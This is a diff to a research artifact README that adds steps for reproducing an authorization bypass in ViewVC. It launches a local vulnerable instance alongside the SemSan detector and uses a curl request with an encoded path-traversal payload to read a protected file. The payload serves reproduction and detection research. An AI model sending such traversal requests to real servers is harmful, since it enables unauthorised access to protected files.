@@ -88,7 +88,23 @@ TODO
 
 ### Authorization Bypass in ViewVC (Ref 55)
 
-TODO
+To reproduce the authorization bypass in ViewVC, run:
+
+```bash
+nix run .#artifact-eval.bugs.viewvc-reproduce
+```
+
+This will open a terminal multiplexer with a vulnerable version of ViewVC
+as well as SemSan with the [corresponding config](/nix/packages/by-name/artifact-eval/bugs/viewvc-reproduce/reproduce-config.yaml).
+
+Request the following URL with cURL or a web browser to trigger the bug:
+
+```bash
+curl 'http://localhost:49152/viewvc/unprivileged/..%2fprivileged/secret.txt'
+```
+
+**Expected output:** In the SemSan output in the multiplexer, you should see:
+`[rcs:3037580] Canary triggered: detected disallowed substring "secret.txt" in arg 1 of syscall openat`
 
 ## RQ2: Detection Accuracy (Sec 7.2)
 
